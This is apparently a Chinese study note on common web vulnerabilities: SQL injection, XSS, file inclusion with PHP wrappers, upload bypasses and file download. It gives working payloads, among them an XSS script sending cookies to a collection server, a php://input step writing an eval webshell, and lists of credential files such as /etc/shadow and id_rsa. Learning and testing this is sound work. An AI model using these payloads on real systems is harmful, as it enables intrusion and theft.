# TOP漏洞

![Mapping of the relationship between the Top 10 2017 and the new Top 10 2021](PictureFile/【Web】TOP漏洞.assets/image1.png)

## Sql注入

### 选用注释问题

（GET提交方式）：

　　 -- （后面有空格）

　　 %23

　　payload结尾单引号闭合

（POST提交方式）：

　　 -- （后面有空格）

　　 #

　　 payload结尾单引号闭合

### 普通注入型

#### 数字型

数字型SQL注入是一种SQL注入攻击的特定类型，**其主要目标是在数据库查询中注入数字值，而不是字符串或其他数据类型**。SQL注入是一种常见的网络安全漏洞，攻击者通过在输入字段中插入恶意SQL代码来利用这种漏洞。

数字型SQL注入通常发生在用户提供数字输入的情况下，例如在网页表单中输入年龄、价格、数量等等。攻击者试图将恶意的SQL代码插入到这些数字输入字段中，以尝试执行未经授权的数据库操作。

以下是数字型SQL注入的一个简单示例。假设一个网站有一个搜索功能，允许用户根据产品价格来搜索商品：

原始查询:
```sql
SELECT * FROM products WHERE price = $user_input;
```

攻击者可以尝试在价格字段中注入恶意SQL代码，例如：

用户输入: 100 OR 1=1;

修改后的查询:
```sql
SELECT * FROM products WHERE price = 100 OR 1=1;
```

上述注入将导致数据库检索所有产品，而不仅仅是价格为100的产品，因为1=1始终为真。

为了防止数字型SQL注入攻击，开发人员应该使用参数化查询或预处理语句，以确保用户输入的数据被正确地转义和处理，而不会被视为SQL代码的一部分。这样可以有效地防止恶意用户利用数字型SQL注入来访问或修改数据库中的数据。

#### 字符型

字符型SQL注入是一种SQL注入攻击的常见形式，攻击者利用这种漏洞通过输入恶意的字符或字符串来篡改、绕过或操纵应用程序与数据库之间的SQL查询。**这种类型的攻击通常发生在用户提供文本输入的情况下，例如在网页表单、搜索框、用户名和密码字段等**。

字符型SQL注入攻击的目标是使应用程序的SQL查询变得不安全，以便攻击者可以执行不经授权的数据库操作或者获取敏感数据。以下是一个字符型SQL注入的简单示例：

假设一个网站有一个登录表单，用户可以通过输入用户名和密码来登录。应用程序可能会使用以下方式来验证用户的身份：

```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

攻击者可以尝试在用户名和/或密码字段中输入恶意字符来欺骗应用程序，例如：

用户名：admin' OR '1'='1
密码：任意密码

修改后的查询：
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='任意密码';
```

上述注入将使数据库返回与用户名'admin'相关的记录，并且'1'='1'条件始终为真，因此攻击者可以成功绕过身份验证，以admin用户身份登录。

为了防止字符型SQL注入攻击，开发人员应该使用参数化查询、预处理语句或使用安全的数据库访问框架，以确保用户输入的数据被正确地转义和处理，不会被解释为SQL代码的一部分。这样可以有效地防止恶意用户利用字符型SQL注入来危害应用程序的安全性。

####  搜索型

搜索型注入（Search-based Injection）是一种SQL注入攻击的变种，它通常涉及到用户在应用程序中执行搜索操作的情况。攻击者利用这种漏洞，通过操纵搜索查询来执行恶意的数据库操作或者泄露敏感数据。

搜索型注入攻击通常发生在以下情况下：

1. 搜索表单：当用户可以在网站或应用程序中执行搜索操作时，例如搜索产品、文章、用户或其他信息。攻击者可以在搜索框中输入恶意查询以尝试注入恶意代码。

2. URL参数：有时，搜索查询可以作为URL参数传递给应用程序。攻击者可以修改URL中的参数以执行注入攻击。

以下是一个搜索型注入攻击的简单示例，假设一个网站有一个搜索功能，用户可以搜索产品名称：

原始查询：
```sql
SELECT * FROM products WHERE name LIKE '%$user_input%';
```

攻击者可以尝试在搜索框中输入以下内容：

```
' OR 1=1 #
```

修改后的查询：
```sql
SELECT * FROM products WHERE name LIKE '%' OR 1=1 # %';
```

上述注入将导致数据库返回所有产品，因为1=1条件始终为真，而注释符号"-- "会注释掉查询中的其余部分，从而绕过了原始查询的限制。

为了防止搜索型注入攻击，开发人员应该对用户输入进行适当的过滤和转义，或者使用参数化查询来构建SQL查询，以确保用户输入不会被解释为SQL代码的一部分。此外，还可以实施访问控制和权限控制，以减少潜在攻击的影响。

#### xx型

正常sql:

```
SELECT * FROM products WHERE name = 'Sky';
```

xx型:加上括号或者反引号照样可以运行

```
SELECT * FROM products WHERE `name` = ('Sky');
```

' union select user,authentication_string from mysql.user #;

### 函数报错注入型

#### 利用updataxml函数

优点：各种sql类型都可使用，适用于无回显类型

缺点：返回数据长度有限

```sql
updatexml(xml_doument,XPath_string,new_value)
```

第一个参数：XML的内容
第二个参数：是需要update的位置XPATH路径
第三个参数：是更新后的内容
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式
比如：

```sql
select * from address_book where sex=1 and updatexml(222,concat(0x7e,version()),111);
# 0x7e就是代表‘~’，concat负责连接~和version。
```

得到：                                                                                                    

```sql
ERROR 1105 (HY000): XPATH syntax error: '~5.7.24'
```

注入例子：

```sql
# 数字型
id=1 and updatexml(1,concat(0x7e,user()),1)
SQL:select xx from user where id=1 and updatexml(1,concat(0x7e,user()),1) #;

# 字符型
user' and updatexml(1,concat(0x7e,database()),1) #
SQL:select xx from user where username='user' and updatexml(1,concat(0x7e,database()),1) #'

# 搜索型
' and updatexml(1,concat(0x7e,database()),1) #
SELECT * FROM products WHERE name LIKE '%' and updatexml(1,concat(0x7e,database()),1) #%';

# xx型
user') and updatexml(1,concat(0x7e,database()),1) #
SQL:select xx from user where username=('user') and updatexml(1,concat(0x7e,database()),1) #'

# insert型
username=sky' and updatexml(1,concat(0x7e,version()),1) or '&password=123123&sex=1&phonenum=123&email=123&add=123&submit=submit
SQL:insert into user vlues('sky' and updatexml(1,concat(0x7e,version()),1) or '',password,xx,xx,xx)

# delete型
id=61 and updatexml(1,concat(0x7e,database()),1)
SQL:delete from user where id=61 and updatexml(1,concat(0x7e,database()),1);

# Header型
pyload' or updatexml(1,concat(0x7e,version()),1) or '
SQL:insert into info vlues('pyload' or updatexml(1,concat(0x7e,version()),1) or '',xx,xx,xx,xx)

# Cookie型
Cookie: ant[uname]=admin' or updatexml(1,concat(0x7e,version()),1) or ';
ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=165edlt61tcbb4rtocpniultdq

SQL:insert into info vlues('admin' or updatexml(1,concat(0x7e,version()),1) or '',10470c3b4b1fed12c3baac014be15fac67c6e815,165edlt61tcbb4rtocpniultdq)
```

### 盲注

#### 布尔盲注

布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 `true` 、 `false`使web页面返回true或者false，从而达到注入的目的来获取信息。

猜测database长度Pyload：

```
admin' and length(database())=1 #
需要利用burpsuite进行sniper达到猜测长度的目的
```

猜测database每个具体字母或数字Pyload：

```
admin' and ascii(substr(database(),1,1))>48 #
admin' and ascii(substr(database(),7,1))>120 #
'1'和'48'为sniper点
```

#### 时间型盲注

注入SQL 代码之后， 存在以下两种情况：

- 如果注入的SQL代码不影响后台[ 数据库] 的正常功能执行， 那么Web 应用的页面显示正确（ 原始页面） 。
- 如果注入的SQL 代码影响后台数据库的正常功能（ 产生了SQL 注入） ， 但是此时Web 应用的页面依旧显示正常（ 原因是Web 应用程序采取了“ 重定向" 或“ 屏蔽 ”措施）。

产生一个疑问： 注入的SQL 代码到底被后台数据库执行了没有？ 即web 应用程序是否存在SQL 注入？
面对这种情况， 之前讲的基于布尔的SQL 盲注很难发挥作用了（ 因为基于布尔的SQL 盲注的前提是web 程序返回的页面存在true 和false 两种不同的页面） 。这时，一般采用基于web 应用响应时间上的差异来判断是否存在SQL 注入， 即基于时间型SQL 盲注。

Pyload例子：

```sql
vince' and if(length(database())=7,sleep(5),null)#
```

IF(expr1 ，expr2 ，expr3) 如果expr1 为真， 则IF() 函数执行expr2 语句； 否则IF() 函数执行expr3 语句。

### 宽字节注入

#### 什么是宽字节？

如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，成为宽字节

- 像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节
- 英文默认占一个字节，中文占两个字节

#### 什么是宽字节注入？

原理：宽字节注入发生的位置就是PHP发送请求到[MYSQL](https://cloud.tencent.com/product/cdb?from_column=20065&from=20065)时字符集使用character_set_client设置值进行了一次编码。在使用PHP连接MySQL的时候，当设置“character_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入

宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）

GBK首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），例如%df和%5C会结合；GB2312是被GBK兼容的，它的高位范围是0xA1-0xF7，低位范围是0xA1-0xFE(0x5C不在该范围内)，因此不能使用编码吃掉%5c

Pyload：

```sql
vince%df' or 1=1#
```

加上%df后，%df会和反斜线%5c吃掉，%df%5c会变成一个中文字符運，达到去掉反斜线的作用。

理论上的sql：

```sql
select id,email from member where username='vince運' or 1=1#
```

### 文件读写

1、需要知道数据库所在服务器的物理目录,也就是要找到服务器的某个目录,因为后面要上传文件,这个条件不太容易满足

2、需要mysql的root权限，这个其实很多运维人员为了方便，有时候会开启远程root用户，进行操作。这个条件比较容易满足

3、需要远程目录有写权限,因为目录找到了之后,如果目录没有写权限,那么我们的文件是不能够上传到该目录中去了,写权限的意思就是可以在这个目录中创建文件。一般情况下都是有写权限的,不然很多正常的代码文件都不能上传到目录,而且好多运维人员在创建这种代码目录的时候(nginx,apache、IIS等），都是以管理员身份来创建的。这个条件比较容易满足

4、需要数据库开启secure_file_priv，看下面的解释，其实这个条件很难满足的，但是有些DBA可能会开启这个文件，因为他想上传一些文件的时候，也需要开启这个功能才行。

使用联合查询语句构造，利用注入读取/ect/passwd 文件（linux系统）

```sql
' UNION SELECT 1,load_file(/etc/passwd)#
```

使用联合查询语句构造，利用注入读取c:\1.txt （Windows系统）

```sql
' UNION SELECT 1,load_file('0x433a2f55736572732f48502f4465736b746f702f746573742e747874')# 或者' union select 1,load_file('C:/Users/HP/Desktop/test.txt')#
```

## XSS

### 概述

XSS全称（Cross Site Scripting）跨站脚本攻击，为了避免和CSS层叠样式表名称冲突，所以改为了XSS，是最常见的Web应用程序安全漏洞之一，位于OWASP top 10 2013/2017年度分别为第三名和第七名, XSS是指攻击者在网页中嵌入客户端脚本,通常是JavaScript编写的危险代码,当用户使用浏览器浏览网页时,脚本就会在用户的浏览器上执行,从而达到攻击者的目的。

### 反射型

交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。

Pyload：

```js
'"><script>alert(123)</script>
```

### 存储型

交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性。

Pyload：

```js
'"><script>alert(123)</script>
```

### DOM型

不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞，也是属于低危漏洞了。

Pyload：

```js
'" onclick="alert(123)"
```

### 实例

#### 反射型获取cookie

PS：记得提前搭建接收服务器

```
'"><script>document.location ='http://192.168.229.129/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
```

#### Xss钓鱼

```
'"><script src="http://192.168.229.129/pikachu/pkxss/xfish/fish.php"></script>
```

## 文件包含

### 本地文件包含

#### 概述

​		仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。

以PHP为例,常用的文件包含函数有以下四种

```
include(),require(),include_once(),require_once()

require():找不到被包含的文件会产生致命错误，并停止脚本运行
include():找不到被包含的文件只会产生警告，脚本继续执行
require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
```

```php
<?php
	include $_GET['test'];
?>
```
#### 条件

php.ini中

allow_url_include=On 开启 allow_url_fopen=On (默认开启)

使用了include()等文件包含函数

#### 例子

<img src="PictureFile/【Web】TOP漏洞.assets/image-20231014212844639.png" alt="image-20231014212844639" style="zoom: 80%;" />

**include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。**

#### 常见的敏感目录信息路径

Windows系统:

```
C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
C:\windows\repair\sam //存储Windows系统初次安装的密码
C:\ProgramFiles\mysql\my.ini //Mysql配置
C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
C:\windows\php.ini //php配置信息
```

Linux/Unix系统:

```
/etc/password //账户信息
/etc/shadow //账户密码信息
/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
/usr/local/app/php5/lib/php.ini //PHP相关配置
/etc/httpd/conf/httpd.conf //Apache配置文件
/etc/my.conf //mysql配置文件
```

### 远程文件包含

#### 概述

​		能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。

#### 条件

php.ini中allow_url_include=On 开启 allow_url_fopen=On (默认开启)

#### 例子

在filename中可以输入url包含任意代码

![image-20231014214521814](PictureFile/【Web】TOP漏洞.assets/image-20231014214521814.png)

### PHP伪协议

PHP内置了很多URL风格的封装协议，可用于类似`fopen()`、`copy()`、`file_exists()`和`filesize()`的文件系统函数

**常用伪协议**：

```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```

#### `file://` 协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :off/on

- **作用**：
  用于访问本地文件系统，在CTF中通常用来**读取本地文件**的且不受`allow_url_fopen`与`allow_url_include`的影响。
  `include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照php语法进行解析，这是`include()`函数所决定的。

- **说明**：
  `file://` 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 `fopen()` 和 `file_get_contents()`，`include_path `会可选地搜索，也作为相对的路径。

- **用法**：

  ```pgsql
  /path/to/file.ext
  relative/path/to/file.ext
  fileInCwd.ext
  C:/path/to/winfile.ext
  C:\path\to\winfile.ext
  \\smbserver\share\path\to\winfile.ext
  file:///path/to/file.ext
  ```

- **示例**：

  1. `file://[文件的绝对路径和文件名]`

     ```http
     http://192.168.229.128/pikachu/vul/fileinclude/fi_remote.php?filename=file://C:\Users\HP\Desktop\phpstudy_pro\WWW\pikachu\vul\fileinclude\hhh.txt
     ```

     ![image-20231015193734930](PictureFile/【Web】TOP漏洞.assets/image-20231015193734930.png)

  2. `[文件的相对路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=./phpinfo.txt
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQA1.jpeg)

  3. `[http：//网络路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBb.jpeg)

- **参考**：[http://php.net/manual/zh/wrappers.file.php](https://link.segmentfault.com/?enc=I4zYaGZF2MlTuKoeCixphA%3D%3D.rtCOewkEergtFURKcBVA8TLIF9uriAFobgwwW7sP0CUPY%2Bz4OsneIMf%2FqKq%2F02nD)

#### `php://` 协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp `需要on

- **作用**：
  `php://` 访问各个输入/输出流（I/O streams），在CTF中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于**执行php代码**。

- **说明**：
  PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，
  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

  | 协议                    | 作用                                                         |
  | ----------------------- | ------------------------------------------------------------ |
  | php://input             | 可以访问请求的原始数据的只读流，在POST请求中访问POST的`data`部分，在`enctype="multipart/form-data"` 的时候`php://input `是无效的。 |
  | php://output            | 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 |
  | php://fd                | (>=5.3.6)允许直接访问指定的文件描述符。例如 `php://fd/3` 引用了文件描述符 3。 |
  | php://memory php://temp | (>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 `php://memory` 总是把数据储存在内存中，而 `php://temp` 会在内存量达到预定义的限制后（默认是 `2MB`）存入临时文件中。临时文件位置的决定和 `sys_get_temp_dir()` 的方式一致。 |
  | php://filter            | (>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式`（all-in-one）`的文件函数非常有用，类似 `readfile()`、`file()` 和 `file_get_contents()`，在数据流内容读取之前没有机会应用其他过滤器。 |

- **`php://filter`参数详解**

  该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：

  | php://filter 参数         | 描述                                                         |           |
  | ------------------------- | ------------------------------------------------------------ | --------- |
  | resource=<要过滤的数据流> | 必须项。它指定了你要筛选过滤的数据流。                       |           |
  | read=<读链的过滤器>       | 可选项。可以设定一个或多个过滤器名称，以管道符（*\           | *）分隔。 |
  | write=<写链的过滤器>      | 可选项。可以设定一个或多个过滤器名称，以管道符（\            | ）分隔。  |
  | <; 两个链的过滤器>        | 任何没有以 *read=* 或 *write=* 作前缀的筛选器列表会视情况应用于读或写链。 |           |

- **可用的过滤器列表（4类）**

  此处列举主要的过滤器类型，详细内容请参考：[https://www.php.net/manual/zh/filters.php](https://link.segmentfault.com/?enc=i0AefZ41XmZUi6ErxVxEDg%3D%3D.RRosc6a0xeUpDY%2FWwb%2BOX1PXk9X3CiU8glEtnzAg%2F6WkVs6LoFrvdRFctr44RGxX)

  | 字符串过滤器      | 作用                                        |
  | ----------------- | ------------------------------------------- |
  | string.rot13      | 等同于`str_rot13()`，rot13变换              |
  | string.toupper    | 等同于`strtoupper()`，转大写字母            |
  | string.tolower    | 等同于`strtolower()`，转小写字母            |
  | string.strip_tags | 等同于`strip_tags()`，去除html、PHP语言标签 |

  | 转换过滤器                                                   | 作用                                                       |
  | ------------------------------------------------------------ | ---------------------------------------------------------- |
  | convert.base64-encode & convert.base64-decode                | 等同于`base64_encode()`和`base64_decode()`，base64编码解码 |
  | convert.quoted-printable-encode & convert.quoted-printable-decode | quoted-printable 字符串与 8-bit 字符串编码解码             |

  | 压缩过滤器                        | 作用                                                         |
  | --------------------------------- | ------------------------------------------------------------ |
  | zlib.deflate & zlib.inflate       | 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |
  | bzip2.compress & bzip2.decompress | 同上，在本地文件系统中创建 bz2 兼容文件的方法。              |

  | 加密过滤器 | 作用                   |
  | ---------- | ---------------------- |
  | mcrypt.*   | libmcrypt 对称加密算法 |
  | mdecrypt.* | libmcrypt 对称解密算法 |

- **示例**：

  1. 读取文件源码（针对php文件需要base64编码）

     `php://filter/read=convert.base64-encode/resource=[文件名]`

     ```livecodeserver
     http://192.168.229.128/pikachu/vul/fileinclude/fi_remote.php?filename=php://filter/read=convert.base64-encode/resource=C:\Users\HP\Desktop\hhh.txt
     ```

     ![image-20231015194926981](PictureFile/【Web】TOP漏洞.assets/image-20231015194926981.png)

  2. `php://input + [POST DATA]`执行php代码

     ```php
     http://127.0.0.1/include.php?file=php://input
     [POST DATA部分]
     <?php phpinfo(); ?>
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBh.jpeg)

     若有写入权限，写入一句话木马

     ```php
     http://127.0.0.1/include.php?file=php://input
     [POST DATA部分]
     <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBi.jpeg)

- **参考**：[https://php.net/manual/zh/wrappers.php.php](https://link.segmentfault.com/?enc=l2MsuQMUG739gIWfY%2BwOfw%3D%3D.ataTiBbzao1qhBaky3TVKKYfOE%2BxB1ocxrl1%2FsB0Ud%2F%2FkjIR01B%2FE0VgFIHDKLKD)

#### `zip:// & bzip2:// & zlib://` 协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :off/on

- **作用**：`zip:// & bzip2:// & zlib://` 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx` 等等。

- **示例**：

  1. `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）

     压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传

     ```http
     http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBj.jpeg)

  2. `compress.bzip2://file.bz2`

     压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）

     ```http
     http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBt.jpeg)

  3. `compress.zlib://file.gz`

     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）

     ```http
     http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBu.jpeg)

- **参考**：[http://php.net/manual/zh/wrappers.compression.php](https://link.segmentfault.com/?enc=COGb8k692hTcrPCbVfM2KA%3D%3D.oOI%2Fengy6yZM4ZI7C6IZhX48UZ74pQ0bGkiwacOMlOlBKRorQIB8bye5tEc%2BrWnOuaUJfWMclOA%2F9iz3vsFxXg%3D%3D)

#### `data://` 协议

- **条件**：

  - `allow_url_fopen`:on
  - `allow_url_include` :on

- **作用**：自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。

- **用法**：

  ```awk
  data://text/plain,
  data://text/plain;base64,
  ```

- **示例**：

  1. `data://text/plain,`

     ```http
     http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBB.jpeg)

  2. `data://text/plain;base64,`

     ```http
     http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
     ```

     ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBD.jpeg)

#### `http:// & https://` 协议

- **条件**：

  - `allow_url_fopen`:on
  - `allow_url_include` :on

- **作用**：常规 URL 形式，允许通过 `HTTP 1.0` 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。

- **用法**：

  ```awk
  http://example.com
  http://example.com/file.php?var1=val1&var2=val2
  http://user:password@example.com
  https://example.com
  https://example.com/file.php?var1=val1&var2=val2
  https://user:password@example.com
  ```

- **示例**：

  ```http
  http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
  ```

  ![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBP.jpeg)

#### `phar://` 协议

`phar://`协议与`zip://`类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：

```http
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

![图片描述](PictureFile/【Web】TOP漏洞.assets/bVbrQBX.jpeg)

另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。

## 文件上传

**简介**

​		文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向[服务器](https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065)上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。

​		文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。**大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。**攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。

**漏洞原理**

​		在文件上传的功能处，若服务端脚本语言未对上传的文件进行严格验证和过滤，导致恶意用户上传恶意的脚本文件时，就有可能获取执行服务端命令的能力，这就是文件上传漏洞。

​		文件上传漏洞对Web应用来说是一种非常严重的漏洞。一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的。

**高危触发点**

​		存在文件上传功能的地方都有可能存在文件上传漏洞，比如**相册**、**头像上传**，视频、照片分享。论坛发帖和邮箱等可以**上传附件**的地方也是上传漏阔的高危地带，另外像文件管理器这样的功能也有可能被攻击者所利用。

### 前端检测绕过

1. 删除或者禁用js。
2. 利用Burp Suite绕过;上传符合要求的文件类型，抓包修改文件类型。

### MIME绕过

   部分Web应用系统判定文件类型是通过`content-type字段`，黑客可以通过抓包，将`content-type字段`改为常见的`图片类型`，如`image/gif`，从而绕过校验。

### 大小写绕过

 比如：`aSp`和`pHp`之类。

### 扩展名绕过

比如: `asa`和`cer`之类 `asp:` `asa` `cer` `aspx` `jsp:` `jspx` `jspf` `php:` `php` `php3` `php4` `php5` `phtml` `pht` `exe:` `exee` 

### 点空格绕过

`shell.php.`  `shell.php空格`  `shell.php:1.jpg`  `shell. php::$DATA`  `shell.php:1.jpg`  在windows中，后缀名后面的点和空格都会被删除掉。

### 双写绕过

有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。比如：`pphphp` 

### 截断上传

- 截断类型:PHP%00截断
- 截断原理:由于00代表结束符,所以会把00后面的所有字符都截断
- 截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态

### 图片马绕过

- **条件**
  - 需要结合`解析漏洞`或者`文件包含`才能解析图片马；

- **原理**

  一般文件内容验证使用`getimagesize函数`检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。  本实验就是将一句话木马插入到一个[合法]的图片文件当中,然后用webshell管理工具进行远程连接。

- **制作**

  ```
   copy a.png /b + a.php /a 3.php  
    /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件
    /a:指定以ascii格式复制、合并文件用于txt等文本类文件
  ```

### 解析漏洞

- `.htaccess`文件解析漏洞- apache解析漏洞
- IIS7.0 | IIS7.5 | Nginx的解析漏洞
- IIS6.0解析漏洞

### 二次渲染

- **原理**

  ​		在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。

- **绕过**

  ​		配合文件包含漏洞：  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。  2、可以配合条件竞争：  这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传

- **如何判断图片是否进行了二次处理**

  ​		对比要上传图片与上传后的图片大小，使用`16进制编辑器`打开图片查看上传后保留了哪些数据，查看那些数据被改变。

### 文件头检测

- **原理**

   在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。

- **常见的文件头**


​		 GIF：`47 49 46 38 39 61` png：`89 50 4E 47 0D 0A 1A 0A` JPG：`FF D8 FF E0 00 10 4A 46 49 46`

 在进行`文件头绕过`时，我们可以把上面的`文件头`添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。

### 条件竞争

   条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。 

由于服务器并发处理(同时)多个请求，假如`a用户`上传了木马文件，由于代码执行需要时间，在此过程中`b用户`访问了`a用户`上传的文件，会有以下三种情况： 

1.访问时间点在上传成功之前，没有此文件。 

2.访问时间点在刚上传成功但还没有进行判断，该文件存在。 

3.访问时间点在判断之后，文件被删除，没有此文件。

## 文件下载

- **条件**
  - 存在读文件的函数
  - 读取文件的路径用户可控且未校验或校验不严
  - 输出了文件内容

- **常见敏感目录**

  ```
  Windows：
  C:\boot.ini  //查看系统版本
  C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
  C:\Windows\repair\sam  //存储系统初次安装的密码
  C:\Program Files\mysql\my.ini  //Mysql配置
  C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
  C:\Windows\php.ini  //php配置信息
  C:\Windows\my.ini  //Mysql配置信息
  ...
  Linux：
  /root/.ssh/authorized_keys
  /root/.ssh/id_rsa
